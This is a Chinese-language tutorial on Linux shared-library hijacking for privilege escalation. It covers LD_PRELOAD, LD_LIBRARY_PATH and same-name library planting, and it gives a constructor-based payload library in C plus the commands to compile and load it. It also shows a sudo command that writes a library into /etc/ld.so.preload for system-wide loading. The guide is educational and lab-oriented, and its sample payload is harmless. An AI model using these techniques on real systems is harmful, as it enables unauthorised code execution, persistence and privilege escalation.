# Linux 共享库劫持完整指南

本文件合并了原来的共享库劫持和共享库劫持完整指南内容。旧完整指南已归档到 `_archive\2026-05-07-深度优化`。

## 这篇文档解决什么问题

共享库劫持解决的是：

```text
目标程序会加载某些 .so 库。
如果我能影响它加载哪个库，就可能在程序启动时执行我的代码。
```

它类似 Windows DLL 劫持，但 Linux 的搜索路径、环境变量和动态链接器规则不同。

## 共享库是什么

共享库是多个程序共用的代码文件，通常以 `.so` 结尾。

```text
Windows：DLL
Linux：Shared Object / .so
```

好处是节省空间、复用代码。攻击面是：程序启动时必须找到并加载这些库。

## 动态库加载顺序

常见搜索顺序可以粗略理解为：

```text
RPATH
LD_LIBRARY_PATH
RUNPATH
/etc/ld.so.conf
/lib, /lib64, /usr/lib, /usr/lib64 等系统目录
```

学习时不必一开始背全部细节，但要记住：

```text
谁越早出现在搜索顺序里，谁越有机会被程序加载。
```

## 基础枚举

查看程序依赖：

```bash
ldd /usr/bin/top
```

查看 ELF 动态段：

```bash
readelf -d /path/to/program
```

找可疑路径：

```bash
find / -writable -type d 2>/dev/null | head
echo $LD_LIBRARY_PATH
cat /etc/ld.so.conf 2>/dev/null
ls -la /etc/ld.so.conf.d 2>/dev/null
```

## 方法一：LD_PRELOAD

`LD_PRELOAD` 会让动态链接器在程序启动前预加载指定库。

### 恶意库示例

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void run_payload() __attribute__((constructor));

void run_payload()
{
    system("id > /tmp/ld_preload_test.txt");
}
```

编译：

```bash
gcc -shared -fPIC -o libpreload.so preload.c
```

使用：

```bash
LD_PRELOAD=$PWD/libpreload.so /bin/ls
cat /tmp/ld_preload_test.txt
```

### 关键理解

| 点 | 解释 |
|---|---|
| `constructor` | 库加载时自动执行 |
| `LD_PRELOAD` | 指定预加载库 |
| 程序启动 | 你的库在目标程序运行前被加载 |

## 方法二：LD_LIBRARY_PATH

`LD_LIBRARY_PATH` 指定额外库搜索目录。

攻击思路：

```text
目标程序需要 libexample.so
你控制一个搜索优先级更高的目录
你在里面放一个同名 libexample.so
程序加载你的库
```

示例：

```bash
mkdir -p /tmp/libs
cp libpayload.so /tmp/libs/libtarget.so
export LD_LIBRARY_PATH=/tmp/libs
/path/to/target_program
```

## 方法三：同名库劫持

有时程序依赖某个库，但搜索路径中某个目录可写。你可以放置同名库。

排查步骤：

```bash
ldd ./target
readelf -d ./target | grep -E "RPATH|RUNPATH|NEEDED"
```

找：

```text
NEEDED 需要哪些库
RPATH/RUNPATH 指向哪里
这些目录是否可写
```

## 符号缺失问题

共享库劫持常见报错：

```text
symbol xxx not defined
```

原因是目标程序期望库里有某些函数或符号，你的恶意库没有。

排查：

```bash
readelf -s --wide /path/to/original.so
nm -D /path/to/original.so
```

解决思路：

```text
补齐必要符号
转发调用到原始库
选择更简单的目标库
```

初学者阶段先理解“符号缺失为什么发生”，不必一开始追求复杂转发。

## `/etc/ld.so.preload`

这是系统级预加载配置。写入这里的库会被许多动态链接程序加载。

```bash
echo "/path/to/libpayload.so" | sudo tee /etc/ld.so.preload
```

风险很高：

```text
写错会导致系统大量程序崩溃
需要 root 权限
非常容易造成稳定性问题
```

学习时只在实验环境谨慎验证。

## 利用前提

共享库劫持不是“看到 .so 就能打”。你要确认：

| 前提 | 说明 |
|---|---|
| 程序是动态链接 | 静态编译程序不走共享库加载 |
| 你能影响搜索路径 | 环境变量、RPATH、可写目录 |
| 库名或符号匹配 | 目标程序能成功加载 |
| 权限有价值 | 如果只是低权限执行，收益有限 |
| 防护没有阻止 | 某些环境会清理 LD_* 变量 |

## SUID 和安全限制

对 SUID 程序，动态链接器会进入更严格的安全模式，很多环境变量可能被忽略，例如 `LD_PRELOAD`。

所以：

```text
普通程序能被 LD_PRELOAD 影响
不代表 SUID 程序也能被同样方式影响
```

这是初学者很容易踩的坑。

## 排错表

| 现象 | 可能原因 | 排查 |
|---|---|---|
| 库没有加载 | 路径不在搜索顺序中 | `readelf -d`、`echo $LD_LIBRARY_PATH` |
| 报符号缺失 | 恶意库缺少目标符号 | `nm -D`、`readelf -s` |
| 程序崩溃 | ABI 不兼容或逻辑破坏 | 先做最小 constructor 测试 |
| SUID 不受影响 | 安全模式忽略环境变量 | 换思路，不要死磕 |
| 执行了但没提权 | 运行用户本身权限低 | 找高权限触发点 |
